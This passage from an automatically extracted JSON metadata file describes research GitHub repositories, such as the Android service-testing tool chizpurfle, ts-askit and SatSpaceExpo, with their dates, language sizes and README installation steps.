        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T18:07:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 539956
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2056
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "718": {
        "filename": "dessertlab_fantastic_beasts_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dessertlab/fantastic_beasts",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Once you cloned the project, you need to attach your Android device to the workstation, and to activate debug options on the device.\n\nTo build and install chizpurfle, run:\n```bash\ncd fantastic_beasts\nbunzip2 ./chizpurfle/libs/frida-core/libfrida-core.a.bz2\n./gradlew installAppProcess\n```\n\nThis installs all the necessary files on your device. To check it, run:\n```bash\nadb shell\nls /data/local/tmp\n> chizpurfle\n> chizpurfle.jar\n> cli.jar\n> libstalker-server.so\n> libchizpurfle-native.so\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "INSTALL",
                    "parent_header": [
                        "CHIZPURFLE"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dessertlab/fantastic_beasts/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The tool does not require to recompile the source code of the Android OS. Therefore, it can be adopted for testing any vendor (proprietary, closed-source) customization of the Android OS. \n",
                    "original_header": "CHIZPURFLE"
                },
                "confidence": 0.9365241474101542,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dessertlab/fantastic_beasts/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "First and former, you must install [FRIDA](https://www.frida.re/) both on your workstation (client) and device (server).\n(tested version [10.6.61](https://github.com/frida/frida/releases/tag/10.6.61)) \nRun the frida server as root:\n```bash\nadb shell\nsu\ncd /data/local/tmp\n./frida-server &\n``` \n\nThen, run the following command on your workstation:\n```bash\npython init_scripts/create_service_pid_map.py\n```\n(If there are errors at locating the device, you can place the device ID from `adb devices` in lines 81 and 85). \n\nThis command will instrument the Service Manager on your device, and will stay on hold. \nFinally, press *enter* to terminate the `create_service_pid_map.py` python script. \nIf you want a full model of your device service interfaces, run:\n```bash\nadb shell\nsu\ncd /data/local/tmp\n./chizpurfle -e\nchmod 666 all_services_interfaces_in_binder.json\nexit\nadb pull /data/local/tmp/all_services_interfaces_in_binder.json\n```\n`all_services_interfaces_in_binder.json` is a json file that provides all the service interfaces of your devices. \n",
                    "original_header": "INIT"
                },
                "confidence": 0.9891045864103059,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dessertlab/fantastic_beasts/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-03-01T09:18:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-10T14:00:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 3452277
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 248531
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 22936
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2388
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 1763
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 764
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "719": {
        "filename": "sidongfeng_gifdroid_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sidongfeng/gifdroid",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-08-31T02:49:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-07T06:15:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 11587
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "720": {
        "filename": "bThink-BGU_BPjs-Context_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bThink-BGU/COBPjs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This section assumes that you are already familiar with the COBP paradigm. If this is not the case, you should start by reading the [COBP Paper](https://www.sciencedirect.com/science/article/pii/S095058492030094X). \n> [!IMPORTANT]  \n> You must not use ```bp.sync``` and BASH2*. Instead, use BASH3* and BASH4*.\n>\n> If you wish to bind a bthread to a context, use BASH5*.\n \n",
                    "original_header": "Writing COBP Programs"
                },
                "confidence": 0.9711954640391591,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bThink-BGU/BPjs-Context/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-12-27T12:19:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-15T17:57:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 66847
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 54491
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "721": {
        "filename": "tum-i4_Automated-Identification-of-Security-Relevant-Configuration-Settings-Using-NLP_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tum-i4/Automated-Identification-of-Security-Relevant-Configuration-Settings-Using-NLP",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-03-09T12:37:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-09-01T15:37:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 108353
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "722": {
        "filename": "katsumiok_ts-askit_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/katsumiok/ts-askit",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Before starting, ensure that [Node.js](http://nodejs.org/) and [npm](https://npmjs.com) are installed on your system. Then, execute the following command:\n\n```bash\nnpm install ts-askit\n```\n\nThis package relies on `ts-patch`. To install `ts-patch`, run:\n\n```bash\nnpx ts-patch install\n```\n\nAdd the following snippet to your `tsconfig.json`:\n\n```json\n\"compilerOptions\": {\n    \"plugins\": [{ \"transform\": \"ts-askit/transform\" }]\n}\n```\n\nThis modification allows the TypeScript compiler to support type parameters for the `ask` and `define` APIs in AskIt.\n\nThe `ts-patch` package is crucial for unleashing the full potential of AskIt, as it extends the TypeScript compiler to fully integrate AskIt's type system. While AskIt can be used without `ts-patch`, this integration offers a more feature-rich experience.\n\nBefore using *AskIt*, you need to set your OpenAI API key as an environment variable `OPENAI_API_KEY`:\n```bash\nexport OPENAI_API_KEY=<your OpenAI API key>\n```\n`<your OpenAI API key>` is a string that looks like this: `sk-<your key>`.\n You can find your API key in the [OpenAI dashboard](https://platform.openai.com/account/api-keys).\n\nYou can also specify the model name as an environment variable `ASKIT_MODEL`:\n```bash\nexport ASKIT_MODEL=<model name>\n```\n`<model name>` is the name of the model you want to use. \nThe latest AskIt is tested with `gpt-4` and `gpt-3.5-turbo-16k`. You can find the list of available models in the [OpenAI API documentation](https://platform.openai.com/docs/models).\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "AskIt (ts-askit)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/katsumiok/ts-askit/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-07-20T17:17:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-10T13:49:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 79717
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 8591
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "723": {
        "filename": "sulir_runtimesearch_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sulir/runtimesearch",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To build the project, run the command: \nThe resulting plugin will be stored in `dist/runtimesearch-plugin-*.zip`. It can be installed using the \"Install Plugin from Disk\" command in IntelliJ IDEA. Alternatively, you can run it in a sandbox via `./gradlew runIde`.\n \n",
                    "original_header": "Building from Source"
                },
                "confidence": 0.9961280756416634,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sulir/runtimesearch/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The project consists of an IntelliJ IDEA plugin and a bytecode [instrumentation agent](https://docs.oracle.com/en/java/javase/17/docs/api/java.instrument/java/lang/instrument/package-summary.html). The initial configuration is passed from the IDE to the agent via command-line arguments when executing the target program: \n",
                    "original_header": "Internals"
                },
                "confidence": 0.9884142529023391,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sulir/runtimesearch/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-09-08T20:37:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-01-10T21:33:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 60045
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1660
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "724": {
        "filename": "Sustainable-Open-Science-and-Software_sustainable-communities-tracker_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Sustainable-Open-Science-and-Software/sustainable-communities-tracker",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. You'll need a recent version of node. Run `npm install` to get the dependencies.\n2. in your .bashrc or .zshrc set up a githup api access token. It should look somethingg like this: `EXPORT github_sustain_sw_token=123456678sdfsdfsdfsdfsdfsdf`\n3. run `node index.js` in yer terminal\n",
                    "type": "Text_excerpt",
                    "original_header": "To set up",
                    "parent_header": [
                        "Sustainable communities tracker",
                        "Data collection"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Sustainable-Open-Science-and-Software/sustainable-communities-tracker/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. Full run, on ALL the repos you have in a text file, separated by newlines: \n    ```bash\n    node index.js --month 12 --urlList /path/to/urllist.txt\n    ``` \n",
                    "original_header": "To grab various github api stats"
                },
                "confidence": 0.9985844310153248,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Sustainable-Open-Science-and-Software/sustainable-communities-tracker/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Setup:  \n1. Create a directory in the parent directory of this repo, and call it `localData`. \n2. Copy sample.tsv into localData. \n3. Tweak the repo names and dates, and/or add any lines you need to, to add more repos. \n4. You may also need to give the script permissions to run using `chmod +x` \nThe above setup steps, as one copy-pastable block:  \n    ```bash\n    #go to the folder containing this code.\n    cd sustainable-communities-tracker\n    #change the script to be executable\n    chmod +x /src/localMethods/localMethods.sh\n    \n    # make a folder to store all the output data \n    mkdir ../localData\n    #copy the sample data to the data folder.\n    cp templates/sample.tsv ../localData/sample.tsv\n    ```\n    \nTo run the local script, after the above setup is complete: \n```node\nnpm run localMethods\n```\n \n",
                    "original_header": "Local git-based stats"
                },
                "confidence": 0.9925389728320644,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Sustainable-Open-Science-and-Software/sustainable-communities-tracker/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. copy files generated by the script(s) to `view/_data`\n2. set up [jekyll](https://jekyllrb.com/docs/installation/) if you haven't already (`gem install jekyll bundler`). I use [rvm](https://rvm.io/) to manage ruby versions, it makes things easier.\n3. once it's all set up, cd into the view directory `cd view` and run `bundle exec jekyll serve` - presto, you'll serve the visualisations. \n",
                    "original_header": "Data visualisation component"
                },
                "confidence": 0.999999998745011,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Sustainable-Open-Science-and-Software/sustainable-communities-tracker/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-05-09T15:17:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-11-22T15:05:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 125456
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 61657
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Liquid",
                    "name": "Liquid",
                    "type": "Programming_language",
                    "size": 15124
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SCSS",
                    "name": "SCSS",
                    "type": "Programming_language",
                    "size": 7794
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3148
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ruby",
                    "name": "Ruby",
                    "type": "Programming_language",
                    "size": 2682
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "725": {
        "filename": "SunLab-GMU_PySecDB_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SunLab-GMU/PySecDB",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-07-08T23:03:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T13:25:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "726": {
        "filename": "ai-se_SatSpaceExpo_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ai-se/SatSpaceExpo",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "We used [Z3 v4.8.4](https://github.com/Z3Prover/z3/releases/tag/z3-4.8.4) during the experiment, but newer version could be probably faster.\n```\nwget https://github.com/Z3Prover/z3/archive/z3-4.8.4.tar.gz\ntar -xzf z3-4.8.4.tar.gz\n# follow steps in README.md inside the z3-4.8.4 like following...\npython scripts/mk_make.py\ncd build\nmake\nsudo make install\n```",
                    "type": "Text_excerpt",
                    "original_header": "Step 1. Download and set up Z3 solvers",
                    "parent_header": [
                        "SNAP for building very small test suites",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ai-se/SatSpaceExpo/master/README.md"
            },
            {
                "result": {
                    "value": "In the SNAP, for convenient, we use the ID to represent the benchmarks,  you can also replace or add more test cases by editing the `src/commons/utility/utility.h`.\nBe default, the id shows as \n```\nstatic std::vector<std::string> benchmark_models{\n    \"Benchmarks/Blasted_Real/blasted_case47.cnf\", // 0\n    \"Benchmarks/Blasted_Real/blasted_case110.cnf\", // 1\n    \"Benchmarks/V7/s820a_7_4.cnf\", // 2\n    \"Benchmarks/V15/s820a_15_7.cnf\", // 3\n    \"Benchmarks/V3/s1238a_3_2.cnf\", // 4\n    \"Benchmarks/V3/s1196a_3_2.cnf\", // 5\n    \"Benchmarks/V15/s832a_15_7.cnf\", // 6\n    \"Benchmarks/Blasted_Real/blasted_case_1_b12_2.cnf\", // 7\n    \"Benchmarks/Blasted_Real/blasted_squaring16.cnf\", // 8\n    \"Benchmarks/Blasted_Real/blasted_squaring7.cnf\", // 9\n    \"Benchmarks/70.sk_3_40.cnf\", // 10\n    \"Benchmarks/ProcessBean.sk_8_64.cnf\", // 11\n    \"Benchmarks/56.sk_6_38.cnf\", // 12\n    \"Benchmarks/35.sk_3_52.cnf\", // 13\n    \"Benchmarks/80.sk_2_48.cnf\", // 14\n    \"Benchmarks/7.sk_4_50.cnf\", // 15\n    \"Benchmarks/doublyLinkedList.sk_8_37.cnf\", // 16\n    \"Benchmarks/19.sk_3_48.cnf\", // 17\n    \"Benchmarks/29.sk_3_45.cnf\", // 18\n    \"Benchmarks/isolateRightmost.sk_7_481.cnf\", //19\n    \"Benchmarks/17.sk_3_45.cnf\", // 20\n    \"Benchmarks/81.sk_5_51.cnf\", // 21\n    \"Benchmarks/LoginService2.sk_23_36.cnf\", // 22\n    \"Benchmarks/sort.sk_8_52.cnf\", // 23\n    \"Benchmarks/parity.sk_11_11.cnf\", // 24\n    \"Benchmarks/77.sk_3_44.cnf\", // 25\n    \"Benchmarks/20.sk_1_51.cnf\", // 26\n    \"Benchmarks/enqueueSeqSK.sk_10_42.cnf\", // 27\n    \"Benchmarks/karatsuba.sk_7_41.cnf\", // 28\n    \"Benchmarks/tutorial3.sk_4_31.cnf\" // 29\n};\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 4. Understanding the Benchmark ID",
                    "parent_header": [
                        "SNAP for building very small test suites",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ai-se/SatSpaceExpo/master/README.md"
            },
            {
                "result": {
                    "value": "```\ncd /path/to/SatSpaceExpo\nmake snap\n/path/to/SatSpaceExpo/bin/snap -i ID@Step4\n\n# To clean up all compiled binaries\ncd /path/to/SatSpaceExpo\nmake clean\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 5. Compile SNAP and execution",
                    "parent_header": [
                        "SNAP for building very small test suites",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ai-se/SatSpaceExpo/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-01-28T14:44:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-11-18T09:20:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 14162865
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 1116034
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 148813
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Assembly",
                    "name": "Assembly",
                    "type": "Programming_language",
                    "size": 141281
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ada",
                    "name": "Ada",
                    "type": "Programming_language",
                    "size": 89079
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Pascal",
                    "name": "Pascal",
                    "type": "Programming_language",
                    "size": 75208
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 55627
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 44252
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 29824
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "DIGITAL Command Language",
                    "name": "DIGITAL Command Language",
                    "type": "Programming_language",
                    "size": 27303
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Objective-C",
                    "name": "Objective-C",
                    "type": "Programming_language",
                    "size": 21403
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 18594
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 10727
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 8099
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 7800
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 3895
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SAS",
                    "name": "SAS",
                    "type": "Programming_language",
                    "size": 1847
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Module Management System",
                    "name": "Module Management System",
                    "type": "Programming_language",
                    "size": 1545
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "M4",
                    "name": "M4",
                    "type": "Programming_language",
                    "size": 787
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 178
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "727": {
        "filename": "beyondacm_TDClearner_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/beyondacm/TDClearner",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-08-18T03:13:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-01T12:59:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 57567009
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 35593
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "728": {
        "filename": "iSEngLab_AwesomeLearningAPR_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/iSEngLab/AwesomeLearningAPR",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\ud83d\udd25\ud83d\udd25\ud83d\udd25[2024-05-03] We have released a new paper about LLM4APR, [A Systematic Literature Review on Large Language Models for Automated Program Repair](https://arxiv.org/abs/2405.01466). Please refer to <a href=\"https://arxiv.org/abs/2405.01466\"><img src=\"https://img.shields.io/badge/arXiv-2405.01466-blue.svg\"></a> and <a href=\"https://github.com/iSEngLab/AwesomeLLM4APR/\"><img src=\"https://img.shields.io/badge/GitHub-AwesomeLLM4APR-blue.svg\"></a> \n",
                    "original_header": "Awesome Learning-based APR"
                },
                "confidence": 0.9997868722194697,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/iSEngLab/AwesomeLearningAPR/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Dataset | Language | #Items | Test Case | #Papers Used |\n| :-- | --- | --- | --- | --- |\n| Bears | Java | 251 | yes | 2+ papers |\n| BFP medium | Java | 65454 | no | 9+ papers |\n| BFP samll | Java | 58350 | no | 9+ papers | \n| BigFix | Java | 1.824 M | no | 2+ papers |\n| Bugs2Fix | Java | 92849 | no | 2+ papers | \n| Bugs.jar | Java | 1158 | yes | 3+ papers |\n| Code-Change-Data | Java | 44372 | no | 1+ papers | \n| CodeXGlue | Java | 122 K | no | 1+ papers |\n| CodRep | Java | 58069 | no | 2+ papers | \n| CPatMiner | Java | 44 K | no | 1+ papers |\n| DeepRepair | Java | 374 | no | 1+ papers | \n| Defects4J | Java | 835 | yes | 11+ papers |\n| Function-SStuBs4J | Java | 21047 | no | 1+ papers | \n| IntroClassJava | Java | 998 | yes | 2+ papers |\n| Java-med | Java | 7454 | no | 1+ papers | \n| ManySStuBs4J large | Java | 63923 | no | 1+ papers |\n| ManySStuBs4J small | Java | 10231 | no | 2+ papers | \n| MegaDiff | Java | 663029 | no | 1+ papers |\n| Ponta | Java | 624 | no | 1+ papers |\n| Pull-Request-Data | Java | 10666 | no | 2+ papers |\n| Ratchet | Java | 35 K | no | 1+ papers |\n| Recoder | Java | 103585 | no | 1+ papers |\n| TRANSFER | Java | 408091 | no | 1+ papers |\n| Mesbah | Java | 4.8 M | no | 1+ papers |\n| AOJ | C | 2482 | no | 1+ papers |\n| Big-Vul | C | 3745 | no | 1+ papers |\n| Code4Bench | C | 25 K | yes | 1+ papers |\n| CodeHunt | C | 195 K | yes | 1+ papers |\n| CVEFixes | C |  | 8482 | 2+ papers |\n| DeepFix | C | 6971 | yes | 6+ papers |\n| ManyBugs | C | 185 | yes | 3+ papers |\n| Prophet | C | 69 | yes | 2+ papers |\n| Prutor | C | 6971 | yes | 2+ papers |\n| BugAID | JS | 105133 | no | 4+ papers |\n| BugsJS | JS | 453 | yes | 1+ papers |\n| HOPPITY | JS | 363 K | no | 1+ papers |\n| KATANA | JS | 114 K | no | 1+ papers |\n| REPTORY | JS | 407 K | no | 1+ papers |\n| TFix | JS | 100 K | no | 1+ papers |\n| ETH Py150 | Python | 150 K | no | 3+ papers |\n| GitHub-Python | Python | 3 M | no | 1+ papers |\n| Mester | Python | 13 K | no | 1+ papers |\n| PyPIBug | Python | 2374 | no | 2+ papers |\n| SSB-9M | Python | 9 M | no | 1+ papers |\n| VUDENC | Python | 10 K | no | 1+ papers |\n| Chhatbar | Python | 286 | yes | 1+ papers |\n| SPoC | C++ | 18356 | yes | 1+ papers |\n| QuixBugs | Java,Python | 40 | yes | 11+ papers |\n| DeepDebug | Java,Python | 523 | no | 2+ papers |\n| MSR20 | C,C++ | 188K | no | 1+ papers |\n| CoCoNut | Java,C,JS,Python | 24 M | yes | 4+ papers |\n| CodeFlaw | C,Python | 3902 | yes | 3+ papers |\n| ENCORE | Java,C++,JS,Python | 9.2 M | no | 1+ papers | \n",
                    "original_header": "Datasets"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
